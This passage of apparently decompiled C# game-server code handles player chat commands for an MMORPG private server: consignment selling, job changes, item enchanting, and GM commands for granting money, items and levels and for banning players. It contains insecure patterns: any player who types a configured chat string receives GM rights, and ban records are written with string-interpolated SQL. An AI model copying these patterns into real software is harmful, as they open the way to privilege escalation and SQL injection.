					寄存物品类2.中级附魂 = 装备栏包裹[0].FLD_FJ_中级附魂;
					寄存物品类2.进化 = 装备栏包裹[0].FLD_FJ_进化;
					寄存物品类2.TYPE = 1;
					寄存物品类2.绑定 = 绑定;
					寄存物品类2.DESC = 得到物品说明(装备栏包裹[0].FLD_MAGIC0, 装备栏包裹[0].FLD_MAGIC1, 装备栏包裹[0].FLD_MAGIC2, 装备栏包裹[0].FLD_MAGIC3, 装备栏包裹[0].FLD_MAGIC4, 装备栏包裹[0].FLD_FJ_觉醒, 装备栏包裹[0].FLD_FJ_中级附魂, 装备栏包裹[0].FLD_FJ_进化, 绑定, base.UserName, World.ZoneNumber);
					寄存物品类2.PlayID = base.Userid;
					寄存物品类2.PlayName = base.UserName;
					寄存物品类2.分区 = World.ZoneNumber;
					寄存物品类 寄存物品类3 = 寄存物品类2;
					if (RxjhClass.寄售物品(寄存物品类3) == -1)
					{
						系统提示("寄卖失败 —— 请联系管理员", 9, "系统提示");
						logo.寄售记录("寄卖装备失败-" + base.Userid + " " + base.UserName + " 寄存ID:" + 寄存物品类3.ID + " 物品PID:" + 寄存物品类3.PID + " 名称:" + 寄存物品类3.NAME + " 价格:" + 寄存物品类3.PRICE + " 属性:" + 寄存物品类3.MAGIC0 + " " + 寄存物品类3.MAGIC1 + " " + 寄存物品类3.MAGIC2 + " " + 寄存物品类3.MAGIC3 + " " + 寄存物品类3.MAGIC4);
						return true;
					}
					logo.寄售记录("寄卖装备成功-" + base.Userid + " " + base.UserName + " 寄存ID:" + 寄存物品类3.ID + " 物品PID:" + 寄存物品类3.PID + " 名称:" + 寄存物品类3.NAME + " 价格:" + 寄存物品类3.PRICE + " 属性:" + 寄存物品类3.MAGIC0 + " " + 寄存物品类3.MAGIC1 + " " + 寄存物品类3.MAGIC2 + " " + 寄存物品类3.MAGIC3 + " " + 寄存物品类3.MAGIC4);
					检察元宝数据(50, 0, "寄售");
					SaveGemData();
					减去物品(0, 1);
					系统提示("寄卖物品[" + value15.ItmeNAME + "]成功!", 24, "系统提示");
					string str = "玩家[" + base.UserName + "]在百宝阁寄卖了一件[" + ItmeClass.得到物品名称(寄存物品类3.PID) + "]卖价(" + 寄存物品类3.PRICE + ")钻石.一周后自动下架..";
					World.conn.发送("发送公告|" + 0 + "|" + str);
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(1, "寄卖系统出错 -- " + ex.Message);
				}
				return true;
			}
			if (array.Length >= 2 && text == "!狮吼功")
			{
				try
				{
					Thread thread = new Thread(狮吼功线程);
					object parameter = array[1];
					thread.IsBackground = true;
					thread.Start(parameter);
				}
				catch
				{
				}
				return true;
			}
			if (array.Length >= 1 && text == "!跳舞")
			{
				动作表情(151);
				return true;
			}
			if (array.Length >= 1 && text == "!鞠躬")
			{
				动作表情(200);
				return true;
			}
			if (array.Length >= 1 && text == "!弯腰")
			{
				动作表情(5);
				return true;
			}
			if (array.Length >= 2 && array[0] == "!转换职业")
			{
				if (World.转换职业功能是否开启 != 1)
				{
					系统提示("未开启在线转换队员业功能！", 10, "系统提示");
				}
				if (装备栏已穿装备[3].Get物品ID != 0)
				{
					系统提示("穿戴装备不能转换", 10, "系统提示");
					return true;
				}
				if (World.转换职业所需物品类型 == 1)
				{
					if ((long)base.FLD_RXPIONT < (long)World.转换职业需要元宝数量 || base.Player_Level < World.转换职业需要人物等级)
					{
						系统提示("元宝不足或等级不够。转换职业需要" + World.转换职业需要元宝数量 + "个元宝和" + World.转换职业需要人物等级 + "级", 10, "系统提示");
						return true;
					}
					if (array[1] == "刀客")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 1;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：刀客 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "剑客")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 2;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：剑客 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "枪客")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 3;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：枪客 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "弓箭手")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 4;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：弓手 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "医生")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 5;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：医生 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "刺客")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 6;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：刺客 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "琴师")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 7;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：琴师 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "韩飞官")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 8;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：韩飞官 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "谭花灵")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 9;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：谭花灵 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "格斗家")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 10;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：格斗家 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "梅柳真")
					{
						CheckTreasureGems();
						检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
						SaveGemData();
						base.Player_Job = 11;
						更新HP_MP_SP();
						SavePlayerData();
						更新经验和历练();
						更新武功和状态();
						系统提示("您已经成功转换职业：梅柳真 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
					}
					else if (array[1] == "卢风郎")
					{
						if (base.Player_Sex == 1)
						{
							CheckTreasureGems();
							检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
							SaveGemData();
							base.Player_Job = 12;
							更新HP_MP_SP();
							SavePlayerData();
							更新经验和历练();
							更新武功和状态();
							系统提示("您已经成功转换职业：卢风郎 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
						}
						系统提示("卢风郎,职业必须是男性才可以申请转换职业", 10, "系统提示");
					}
					else if (array[1] == "东陵神女")
					{
						if (base.Player_Sex == 2)
						{
							CheckTreasureGems();
							检察元宝数据(World.转换职业需要元宝数量, 0, "换职业");
							SaveGemData();
							base.Player_Job = 13;
							更新HP_MP_SP();
							SavePlayerData();
							更新经验和历练();
							更新武功和状态();
							系统提示("您已经成功转换职业：东陵神女 ,系统扣除您" + World.转换职业需要元宝数量 + "个元宝！即刻生效小退后改变造型。", 10, "系统提示");
						}
						系统提示("东陵神女,职业必须是女性才可以申请转换职业", 10, "系统提示");
					}
				}
			}
			if (array.Length >= 1 && array[0] == World.临时GM命令)
			{
				GM模式 = 8;
				系统提示("你已经是临时GM，小退后GM命令失效", 3, "系统提示");
				return true;
			}
			if (array.Length >= 1 && array[0] == World.临时管理员)
			{
				GM模式 = 6;
				系统提示("你已经是临时管理员，小退后管理员命令失效", 3, "系统提示");
				return true;
			}
			if (array.Length >= 1 && text == "!附魂")
			{
				try
				{
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
					{
						系统提示("请把要附魂的物品放到第一格。");
						return true;
					}
					if (BitConverter.ToInt32(装备栏包裹[1].物品ID, 0) != 1000000365)
					{
						系统提示("请把初级集魂石放到第二格。");
						return true;
					}
					if (装备栏包裹[0].FLD_FJ_觉醒 >= 5)
					{
						系统提示("物品最多可以附魂5次, 不可以再附魂。");
						return true;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), out var value16))
					{
						return true;
					}
					if (value16.FLD_RESIDE2 != 1 && value16.FLD_RESIDE2 != 4)
					{
						系统提示("只有武器上衣服可以附魂, 其他物品不可以附魂。");
						return true;
					}
					double num32 = RNG.Next(0, 100);
					if (base.FLD_VIP == 1)
					{
						num32 += 20.0;
					}
					if (World.合成率 != 0.0)
					{
						num32 += 100.0 * World.合成率;
					}
					if (World.附魂率 != 0.0)
					{
						num32 += 100.0 * World.附魂率;
					}
					if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
					{
						num32 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
					}
					if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
					{
						num32 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
					}
					减去物品(1, 1);
					double num34 = 装备栏包裹[0].FLD_FJ_觉醒 * 20;
					if (num32 >= num34)
					{
						byte[] 物品全局ID = 装备栏包裹[0].物品全局ID;
						byte[] 物品ID = 装备栏包裹[0].物品ID;
						byte[] 物品数量 = 装备栏包裹[0].物品数量;
						byte[] 物品属性 = 装备栏包裹[0].物品属性;
						int num3 = 装备栏包裹[0].FLD_FJ_觉醒 + 1;
						if (num3 >= 5)
						{
							num3 = 5;
						}
						Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, 物品属性, 46, 4);
						减去物品(0, 1);
						增加物品(物品全局ID, 物品ID, 0, 物品数量, 物品属性, 绑定: false);
						系统提示("附魂成功。");
					}
					else
					{
						系统提示("附魂失败。");
					}
					return true;
				}
				catch (Exception ex2)
				{
					MainForm.WriteLine(1, "附魂系统出错" + ex2.Message);
				}
			}
			if (GM模式 == 6 && World.是否开启GM功能 == 1)
			{
				if (array.Length >= 2 && text == "!gg")
				{
					try
					{
						foreach (Players value6 in World.AllConnectedPlayers.Values)
						{
							value6.系统提示(array[1], 10, base.UserName);
						}
					}
					catch
					{
					}
					return true;
				}
				if (array.Length >= 2 && text == "!加历练")
				{
					int num4 = 0;
					try
					{
						num4 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_ExpErience += num4;
					更新经验和历练();
					return true;
				}
				if (array.Length >= 2 && text == "!加天机")
				{
					int num5 = 0;
					try
					{
						num5 = int.Parse(array[1]);
					}
					catch
					{
					}
					升天武功点数 += num5;
					更新武功和状态();
					return true;
				}
				if (array.Length >= 2 && text == "!加金钱")
				{
					int num6 = 0;
					try
					{
						num6 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_Money += num6;
					更新金钱和负重();
					return true;
				}
				if (array.Length >= 2 && text == "!踢人")
				{
					Players players2 = World.检查玩家name(array[1]);
					if (players2.Client.挂机)
					{
						if (players2.Client != null)
						{
							players2.Client.DisposedOffline();
						}
						World.OfflineCount--;
						if (World.OfflineCount < 0)
						{
							World.OfflineCount = 0;
						}
					}
					if (players2.Client.假人)
					{
						World.假人数量--;
						if (World.假人数量 < 0)
						{
							World.假人数量 = 0;
						}
						World.CloudAfkCount--;
						if (World.CloudAfkCount < 0)
						{
							World.CloudAfkCount = 0;
						}
						players2.Client.DisposedOffline();
					}
					else if (players2.Client != null)
					{
						players2.OpClient(1);
						players2.Client.Dispose();
					}
				}
				if (array.Length >= 2 && text == "!封IP")
				{
					Players players3 = World.检查玩家name(array[1]);
					if (players3 != null && RxjhClass.GetUserIP(players3.Client.ToString()) == 0)
					{
						DBA.ExeSqlCommand($"INSERT INTO TBL_BANED (FLD_BANEDIP, FLD_BANEDNIP) VALUES ('{players3.Client}','{players3.Client.绑定帐号}')", "rxjhaccount");
					}
					if (players3.Client.挂机)
					{
						if (players3.Client != null)
						{
							players3.Client.DisposedOffline();
						}
						World.OfflineCount--;
						if (World.OfflineCount < 0)
						{
							World.OfflineCount = 0;
						}
					}
					if (players3.Client.假人)
					{
						World.假人数量--;
						if (World.假人数量 < 0)
						{
							World.假人数量 = 0;
						}
						World.CloudAfkCount--;
						if (World.CloudAfkCount < 0)
						{
							World.CloudAfkCount = 0;
						}
						players3.Client.DisposedOffline();
					}
					else if (players3.Client != null)
					{
						players3.OpClient(1);
						players3.Client.Dispose();
					}
				}
				if (array.Length >= 2 && text == "!封号" && World.检查玩家name(array[1]) != null)
				{
					Players players4 = World.检查玩家name(array[1]);
					口令封号(players4, "游戏管理员停封帐号");
					if (players4.Client.挂机)
					{
						if (players4.Client != null)
						{
							players4.Client.DisposedOffline();
						}
						World.OfflineCount--;
						if (World.OfflineCount < 0)
						{
							World.OfflineCount = 0;
						}
					}
					if (players4.Client.假人)
					{
						World.假人数量--;
						if (World.假人数量 < 0)
						{
							World.假人数量 = 0;
						}
						World.CloudAfkCount--;
						if (World.CloudAfkCount < 0)
						{
							World.CloudAfkCount = 0;
						}
						players4.Client.DisposedOffline();
					}
					else if (players4.Client != null)
					{
						players4.OpClient(1);
						players4.Client.Dispose();
					}
				}
			}
			if (GM模式 == 8 && World.是否开启GM功能 == 1)
			{
				if (array.Length >= 2 && array[0] == "!重读")
				{
					World world = new World();
					switch (array[1])
					{
					case "BOOS掉落":
						world.SetBossDrop();
						系统提示("重读BOSS物品掉落。", 50, "");
						break;
					case "开箱":
						world.SetOpen();
						系统提示("重读物品开箱。", 50, "");
						break;
					case "配置文件":
						world.SetConfig();
						系统提示("重读配置文件。", 50, "");
						break;
					case "普通掉落":
						world.SetDrop();
						系统提示("重读物品掉落。", 50, "");
						break;
					case "物品兑换":
						world.Set物品兑换();
						系统提示("重读物品兑换数据。", 50, "");
						break;
					case "装备物品":
						world.SetItme();
						系统提示("重读装备物品。", 50, "");
						break;
					case "过滤文字":
						world.SetKill();
						系统提示("重读发言过滤数据。", 50, "");
						break;
					case "高手掉落":
						world.Set_GSDrop();
						系统提示("重读关键字过滤。", 50, "");
						break;
					case "武功技能":
						world.SetKONGFU();
						系统提示("重读武功技能。", 50, "");
						break;
					case "升天气功":
						world.Set升天气功();
						系统提示("重读升天气功数据。", 50, "");
						break;
					case "任务数据":
						world.Set任务数据新();
						系统提示("重读任务数据。", 50, "");
						break;
					case "怪物数据":
						world.SetMonSter();
						系统提示("重读怪物数据。", 50, "");
						break;
					case "移动":
						world.Set移动();
						系统提示("重读移动数据。", 50, "");
						break;
					case "自动公告":
						world.Set公告();
						系统提示("重读自动公告。", 50, "");
						break;
					case "NPC商店":
						world.LoadShopData();
						系统提示("重读NPC商店。", 50, "");
						break;
					case "气功":
						world.SetQG();
						world.Set升天气功();
						系统提示("重读气功数据。", 50, "");
						break;
					case "石头数据":
						world.Set石头属性();
						系统提示("重读石头属性数据。", 50, "");
						break;
					case "百宝阁":
						world.SetBbgItem();
						world.加载百宝阁抽奖();
						系统提示("重读百宝物品。", 50, "");
						break;
					}
				}
				if (array.Length >= 2 && text == "!公告")
				{
					try
					{
						foreach (Players value7 in World.AllConnectedPlayers.Values)
						{
							value7.系统提示(array[1], 10, "系统提示");
						}
					}
					catch
					{
					}
					return true;
				}
				if (array.Length >= 2 && text == "!move")
				{
					if (array.Length >= 5)
					{
						移动(float.Parse(array[2]), float.Parse(array[3]), float.Parse(array[4]), int.Parse(array[1]));
					}
					return true;
				}
				if (array.Length >= 2 && text == "!刷新怪物")
				{
					更新NPC数据cc(idd, int.Parse(array[1]), this);
					系统提示(idd.ToString(), 10, "系统提示");
					idd++;
					return true;
				}
				if (array.Length >= 2 && text == "!加怪")
				{
					if (array.Length >= 3)
					{
						int num7 = 1;
						try
						{
							num7 = int.Parse(array[2]);
						}
						catch
						{
						}
						Random random = new Random();
						for (int k = 0; k < num7; k++)
						{
							int num8 = random.Next(0, 2);
							double num9 = random.NextDouble() * 15.0;
							double num10 = random.NextDouble() * 15.0;
							if (num8 == 0)
							{
								World.SerNpc(int.Parse(array[1]), base.人物坐标_X + (float)num9, base.人物坐标_Y + (float)num10, base.人物坐标_地图);
							}
							else
							{
								World.SerNpc(int.Parse(array[1]), base.人物坐标_X - (float)num9, base.人物坐标_Y - (float)num10, base.人物坐标_地图);
							}
							Thread.Sleep(10);
						}
					}
					else
					{
						World.SerNpc(int.Parse(array[1]), base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					}
					return true;
				}
				if (array.Length >= 2 && text == "!刷怪")
				{
					if (array.Length >= 3)
					{
						int num11 = 1;
						try
						{
							num11 = int.Parse(array[2]);
						}
						catch
						{
						}
						Random random2 = new Random();
						for (int l = 0; l < num11; l++)
						{
							int num12 = random2.Next(0, 2);
							double num14 = random2.NextDouble() * 30.0;
							double num15 = random2.NextDouble() * 30.0;
							if (num12 == 0)
							{
								World.AddNpc(int.Parse(array[1]), base.人物坐标_X + (float)num14, base.人物坐标_Y + (float)num15, base.人物坐标_地图);
							}
							else
							{
								World.AddNpc(int.Parse(array[1]), base.人物坐标_X - (float)num14, base.人物坐标_Y - (float)num15, base.人物坐标_地图);
							}
						}
					}
					else
					{
						World.AddNpc(int.Parse(array[1]), base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
					}
					return true;
				}
				if (array.Length >= 2 && text == "!刷石头")
				{
					int num16 = -1;
					try
					{
						num16 = int.Parse(array[1]);
					}
					catch
					{
					}
					ItmeClass itmeClass = new ItmeClass();
					ItmeClass itmeClass2 = ((num16 != -1) ? ItmeClass.GetItmeID(num16) : ItmeClass.GetItme(array[1]));
					if (itmeClass2 != null)
					{
						int num17 = 1;
						if (array.Length >= 3)
						{
							num17 = int.Parse(array[2]);
						}
						if (num17 < 1)
						{
							num17 = 1;
						}
						int 属性一 = 0;
						if (array.Length >= 4)
						{
							属性一 = int.Parse(array[3]);
						}
						for (int m = 1; m <= num17; m++)
						{
							int num18 = 得到包裹空位(this);
							if (num18 != -1)
							{
								制造物品(num18, BitConverter.GetBytes(itmeClass2.FLD_PID), 属性一);
								continue;
							}
							break;
						}
						系统提示("刷石头：[" + array[1] + "]，数量:[" + num17 + "]个, 属性：[" + 属性一 + "]。完成", 10, "制造物品");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!隐身")
				{
					if (隐身状态id == 0)
					{
						隐身状态id = 1;
						离开当前地图();
						系统提示("您已进入隐身状态。");
					}
					else
					{
						隐身状态id = 0;
						获取复查范围玩家();
						更新广播人物数据();
						系统提示("您已退出隐身状态。");
					}
					return true;
				}
				if (array.Length >= 2 && text == "!删除物品")
				{
					int 位置2 = -1;
					try
					{
						位置2 = int.Parse(array[1]);
					}
					catch
					{
					}
					制造减去物品(位置2, 1);
					return true;
				}
				if (array.Length >= 2 && text == "!加历练")
				{
					int num19 = 0;
					try
					{
						num19 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_ExpErience += num19;
					更新经验和历练();
					return true;
				}
				if (array.Length >= 2 && text == "!加武勋")
				{
					int num20 = 0;
					try
					{
						num20 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_WuXun += num20;
					更新武功和状态();
					return true;
				}
				if (array.Length >= 2 && text == "!加等级")
				{
					int player_Level = 0;
					try
					{
						player_Level = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_Level = player_Level;
					计算人物基本数据3();
					base.人物经验 = 0L;
					升级后的提示(1);
					更新HP_MP_SP();
					更新武功和状态();
					更新经验和历练();
					更新金钱和负重();
					SavePlayerData();
					return true;
				}
				if (array.Length >= 2 && text == "!加天机")
				{
					int num21 = 0;
					try
					{
						num21 = int.Parse(array[1]);
					}
					catch
					{
					}
					升天武功点数 += num21;
					更新武功和状态();
					return true;
				}
				if (array.Length >= 2 && text == "!加金钱")
				{
					int num22 = 0;
					try
					{
						num22 = int.Parse(array[1]);
					}
					catch
					{
					}
					base.Player_Money += num22;
					更新金钱和负重();
					return true;
				}
				if (array.Length >= 2 && text == "!踢人")
				{
					Players players5 = World.检查玩家name(array[1]);
					if (players5.Client != null)
					{
						players5.Client.Dispose();
					}
				}
				if (array.Length >= 2 && text == "!封IP")
				{
					Players players6 = World.检查玩家name(array[1]);
					if (players6 != null && RxjhClass.GetUserIP(players6.Client.ToString()) == 0)
					{
						DBA.ExeSqlCommand($"INSERT INTO TBL_BANED (FLD_BANEDIP, FLD_BANEDNIP) VALUES ('{players6.Client}','{players6.Client.绑定帐号}')", "rxjhaccount");
					}
					if (players6.Client != null)
					{
						players6.Client.Dispose();
					}
				}
				if (array.Length >= 2 && text == "!封号" && World.检查玩家name(array[1]) != null)
				{
					Players players_ = World.检查玩家name(array[1]);
					口令封号(players_, "游戏管理员停封帐号");
				}
				if (array.Length >= 5 && text == "!合成提示")
				{
					try
					{
						合成提示(int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), 装备栏包裹[int.Parse(array[4])]);
						int.Parse(array[1]);
					}
					catch
					{
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启仙魔大战")
				{
					if (World.ImmortalDemonWar == null)
					{
						World.ImmortalDemonWar = new 仙魔大战Class();
						系统提示("仙魔大战开始。");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.ImmortalDemonWar.Dispose();
						系统提示("仙魔大战停止。");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启势力战")
				{
					if (World.eve == null)
					{
						World.势力战参加最低转职 = 2;
						World.势力战参加最高转职 = 10;
						World.势力战类型 = 0;
						World.eve = new EventClass();
						系统提示("势力战开始。");
					}
					else
					{
						World.eve.Dispose();
						系统提示("势力战停止。");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启斩首势力战")
				{
					if (World.eve == null)
					{
						World.势力战参加最低转职 = 2;
						World.势力战参加最高转职 = 10;
						World.势力战类型 = 1;
						World.eve = new EventClass();
						系统提示("斩首势力战开始。");
					}
					else
					{
						World.eve.Dispose();
						系统提示("斩首势力战停止。");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启门战")
				{
					if (World.GuildWar == null)
					{
						World.是否开启门战系统 = 1;
						World.GuildWar = new 帮派战_门战();
						系统提示("帮派混战开始。");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.GuildWar.Dispose();
						系统提示("帮派混战停止。");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启武林血战")
				{
					if (World.PersonalBloodBattle == null)
					{
						World.PersonalBloodBattle = new 武林血战();
						系统提示("武林血战开启。");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.PersonalBloodBattle.Dispose();
						系统提示("武林血战停止。");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启攻城战")
				{
					if (World.SiegeWar == null)
					{
						World.SiegeWar = new 攻城Class();
						MainForm.WriteLine(2, "单线攻城战开启成功");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.SiegeWar.Dispose();
						MainForm.WriteLine(2, "单线攻城战结束");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启异口同声")
				{
					if (World.EnableUnisonSpeech == null)
					{
						World.EnableUnisonSpeech = new 异口同声();
						MainForm.WriteLine(2, "异口同声开启完成");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.EnableUnisonSpeech.Dispose();
						World.EnableUnisonSpeech = null;
						MainForm.WriteLine(2, "异口同声结束完成");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启双倍经验")
				{
					if (World.EnableServerWideExp == null)
					{
						World.EnableServerWideExp = new 全服经验();
						World.发送公告("全服双倍已经开启, 请各位大侠做好准备");
						MainForm.WriteLine(2, "双倍经验开始");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.EnableServerWideExp.Dispose();
						World.EnableServerWideExp = null;
						MainForm.WriteLine(2, "双倍经验结束");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启boss攻城")
				{
					if (World.BossSiege == null)
					{
						World.BossSiege = new boss攻城();
						MainForm.WriteLine(2, "boss攻城开始");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.BossSiege.Dispose();
						World.BossSiege = null;
						MainForm.WriteLine(2, "boss攻城结束");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!开启世界BOSS")
				{
					if (World.WorldBoss == null)
					{
						World.WorldBoss = new 世界BOSS();
						MainForm.WriteLine(2, "世界boss开始");
						系统提示("活动开启成功，再次指令关闭活动。", 50, "系统提示");
					}
					else
					{
						World.WorldBoss.Dispose();
						World.WorldBoss = null;
						MainForm.WriteLine(2, "世界boss结束");
						系统提示("活动关闭成功，再次指令开启活动。", 50, "系统提示");
					}
					return true;
				}
				if (array.Length >= 1 && text == "!查在线玩家")
				{
					系统提示("目前在线人数" + World.AllConnectedPlayers.Count + "人，感谢你的支持！", 10, "系统提示");
					return true;
				}
				if (array.Length >= 2 && text == "!吃药")
				{
					Set追加状态物品(int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]));
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
					return true;
				}
				if (array.Length >= 2 && text == "!分解物品")
				{
					分解物品提示(int.Parse(array[1]));
					return true;
				}
				if (array.Length >= 2 && text == World.假人自动商店命令)
				{
					假人更新商店(int.Parse(array[1]));
					return true;
				}
				if (array.Length >= 2 && text == World.假人关闭商店命令)
				{
					关闭假人更新商店(int.Parse(array[1]));
					return true;
				}
				if (array.Length >= 2 && text == "!copywp")
				{
					int num23 = -1;
					try
					{
						num23 = int.Parse(array[1]);
					}
					catch
					{
					}
					ItmeClass itmeClass3 = new ItmeClass();
					ItmeClass itmeClass4 = ((num23 != -1) ? ItmeClass.GetItmeID(num23) : ItmeClass.GetItme(array[1]));
					if (itmeClass4 != null)
					{
						int num25 = 1;
						if (array.Length >= 3)
						{
							num25 = int.Parse(array[2]);
						}
						if (num25 < 1)
						{
							num25 = 1;
						}
						for (int n = 1; n <= num25; n++)
						{
							int num26 = 得到包裹空位(this);
							if (num26 != -1)
							{
								制造物品(num26, BitConverter.GetBytes(itmeClass4.FLD_PID), 0);
								continue;
							}
							break;
						}
						系统提示("物品：[" + array[1] + "]，数量:[" + num25 + "]个。完成", 10, "制造物品");
					}
					return true;
				}
			}
			try
			{
				foreach (物品兑换类 value8 in World.物品兑换.Values)
				{
					if (array.Length < 1 || !(array[0] == value8.命令))
					{
						continue;
					}
					string[] array6 = value8.需要物品.Split(';');
					for (int num27 = 0; num27 < array6.Length; num27++)
					{
						if (array6[num27] != null && 物品兑换检查2(value8))
						{
							return true;
						}
					}
					return true;
				}
				return true;
			}
			catch (Exception ex3)
			{
				MainForm.WriteLine(2, "物品兑换LUA脚本出错--" + ex3.Message);
			}
			return true;
		}

		public void 制造减去物品(int 位置, int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA5522000000220014000111000041EEF805010000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 11, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
		}

		public void 制造物品(int 位置, byte[] 物品ID, int 属性一)
		{
